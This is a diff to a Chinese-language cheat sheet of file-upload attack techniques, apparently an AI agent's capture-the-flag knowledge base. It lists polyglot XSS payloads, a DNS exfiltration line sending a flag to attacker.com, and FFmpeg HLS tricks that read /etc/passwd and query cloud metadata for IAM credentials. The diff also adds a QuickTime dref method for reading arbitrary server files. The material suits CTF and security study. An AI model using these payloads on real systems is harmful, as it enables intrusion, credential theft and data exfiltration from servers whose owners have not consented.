@@ -62,7 +62,7 @@ Tomcat CVE-2017-12615（readonly=false）：直接 PUT `.jsp` 403 → `PUT /shel
 - **JPEG+JS**：`exiftool -Comment='<script>...</script>'` + text/html 服务 → XSS
 - **GIFAR**（legacy）：`cat header.gif payload.jar > gifar.gif`——浏览器看 GIF、Java 看 JAR
 - **PDF+JS**：PDF 结构尾部 `*/=alert('XSS')/*`
-- **JPEG+HTML polyglot**: PIL 最小合法 JPEG + 追加 HTML/JS——JPEG 容忍尾部数据，MIME 允许时浏览器从任意位置解析 HTML。外带可靠性排序: ①self-upload（fetch /admin 后结果编码进上传文件名，同源无 CSP 顾虑）②webhook（可能被 CSP 拦）③DNS exfil（`new Image().src='http://'+btoa(flag)+'.attacker.com'` 绕多数 CSP）
+- **JPEG+HTML polyglot**: PIL 最小合法 JPEG + 追加 HTML/JS——JPEG 容忍尾部数据，MIME 允许时浏览器从任意位置解析 HTML。外带可靠性排序: ①self-upload（fetch /admin 后结果编码进上传文件名，同源无 CSP 顾虑）②**同站记录型端点**（owner-only pickup log/trace 类——beacon 请求的完整 URL 含 query 被记录，无需任何上传能力与外部回连）③webhook（可能被 CSP 拦）④DNS exfil（`new Image().src='http://'+btoa(flag)+'.attacker.com'` 绕多数 CSP）
 - **扩展名决定 Content-Type**: @fastify/static 等按扩展名定 MIME——noteId 存 `'<img src=x onerror=alert(1)>.html'` → text/html 服务即 XSS；变体: 白名单只查 .jpeg 漏 .jpg → .jpg 以 text/html 服务执行。report 端点 PoW（SHA-256 前缀难度）用 nonce 递增爆破
 
 ## 6. ImageMagick / Ghostscript 链
@@ -85,6 +85,7 @@ SVG 载体：`<image xlink:href="https://example.com/image.jpg&quot;|id ...">`�
 HLS 文件读：`concat:http://attacker.com/header.txt|file:///etc/passwd`（m3u8 EXTINF 条目）。
 HLS SSRF：EXTINF 条目直接填 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`。
 AVI 字幕 SSRF：`-vf "subtitles=http://169.254.169.254/..."`。
+**QuickTime dref 外部数据引用读任意文件**: 构造 MOV，`dref` box 用 `alis` external reference 指向绝对路径（如 `/flag.txt`）替代 self-contained `url ` 自引用，video track 的 chunk offset 置 0 → demuxer 把目标文件字节当 video data 读进处理管线。生效前提: 构建开了 `enable_drefs` + `use_absolute_path`（上游因信息泄露风险默认关闭——服务端自查构建配置）。文件内容经缩略图/转码输出回收: 目标文件首 N 字节被当 rawvideo 帧渲染。**后端指纹**: 生成物 JPEG 的 comment 段 `Lavc<版本>`（如 Lavc59.37.100）= libavcodec 编码器标记，坐实 FFmpeg 系后端。有损压缩信道下传数据用抗损失编码（palette/灰度 codeword + nearest 解码，见 `$AGENT_DIR/knowledge-base/browser-automation.md` §9）。
 
 ## 8. 云存储上传
 
